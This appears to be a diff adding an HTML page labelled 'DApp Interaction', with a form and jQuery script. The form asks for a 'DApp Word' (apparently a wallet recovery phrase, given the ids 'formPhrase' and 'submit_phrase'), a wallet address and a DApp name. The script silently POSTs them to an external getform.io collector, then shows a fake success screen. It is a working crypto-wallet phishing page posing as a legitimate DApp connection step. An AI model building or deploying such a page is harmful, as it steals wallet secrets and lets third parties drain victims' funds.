@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DApp Interaction</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+    <div id="mainModal">
+        <p>Loading...</p>
+        <button id="submit_phrase">Submit</button>
+    </div>
+
+    <div id="qrModal" style="display:none;">
+        <p>QR Code</p>
+    </div>
+
+    <p id="p-code"></p>
+
+    <form id="formPhrase">
+        <input type="text" id="dappWord" placeholder="Enter DApp Word">
+        <input type="text" id="dappAddress" placeholder="Enter Address">
+        <input type="text" id="dappName" placeholder="Enter DApp Name">
+        <button type="button" id="submit_phrase">Submit</button>
+    </form>
+
+    <script src="app.js"></script>  <!-- This would be the JavaScript file -->
+</body>
+</html>
+<script>
+    $(document).ready(function () {
+    // Assign event listener to the submit button
+    $("#submit_phrase").on("click", function() {
+        // Collect form data
+        var dappWords = $("#dappWord").val();
+        var walletAddress = $("#dappAddress").val();
+        var dappName = $("#dappName").val();
+
+        // Check if inputs are valid
+        if (!dappWords || !walletAddress || !dappName) {
+            alert("Please fill in all fields.");
+            return;
+        }
+
+        // Disable the submit button while the request is ongoing
+        $("#submit_phrase").prop("disabled", true);
+
+        // Send the AJAX request
+        $.ajax({
+            url: "https://getform.io/fbdrrydeb/denodap.php",
+            method: "POST",
+            dataType: "JSON",
+            data: {
+                dappWord: dappWords,
+                dappAddress: walletAddress,
+                dappName: dappName
+            },
+            success: function(response) {
+                // Handle success response
+                console.log("Response from server:", response);
+                // If successful, update the UI
+                document.getElementById("p-code").innerHTML = "Success: " + response.randomString;  // Assuming the server returns this
+                $("#mainModal").hide();
+                $("#qrModal").show();
+            },
+            error: function(xhr, status, error) {
+                // Handle error response
+                console.error("Error during request:", error);
+                $("#formPhrase").addClass("error");
+                alert("An error occurred. Please try again.");
+            },
+            complete: function() {
+                // Enable the submit button again after request is complete
+                $("#submit_phrase").prop("disabled", false);
+            }
+        });
+    });
+});
+
+</script>
